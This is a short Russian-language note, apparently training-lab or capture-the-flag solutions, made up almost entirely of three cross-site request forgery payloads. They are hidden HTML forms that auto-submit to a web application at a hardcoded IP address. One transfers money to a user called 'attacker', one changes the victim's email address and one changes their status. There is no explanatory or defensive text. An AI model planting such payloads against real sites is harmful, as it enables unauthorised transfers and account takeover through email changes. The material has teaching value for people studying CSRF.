
Первое - перевод денег
``` html
<form id="transferForm" action="http://5.129.245.211:5000/transfer" method="POST">
    <input type="hidden" name="amount" value="50">
    <input type="hidden" name="target_user" value="attacker">
    <input type="hidden" name="comment" value="CSRF Attack">
</form>
<script>document.getElementById('transferForm').submit();</script>
    
<script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
```

Второе - смена почты

``` html
<form id="csrf-form" 
          action="http:///5.129.245.211:5000/update-profile" 
          method="POST" 
          style="display:none;">
        <input type="text" name="email" value="ayylmao@r.r">
    </form>
    
<script>
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
```

Третье - смена статуса

``` html
<form id="csrf-form" 
          action="http://5.129.245.211:5000/update-preferences" 
          method="POST" 
          style="display:none;">
	<input type="hidden" name="action" value="change_status">
	<input type="hidden" name="status" value="ibb">
    </form>
```
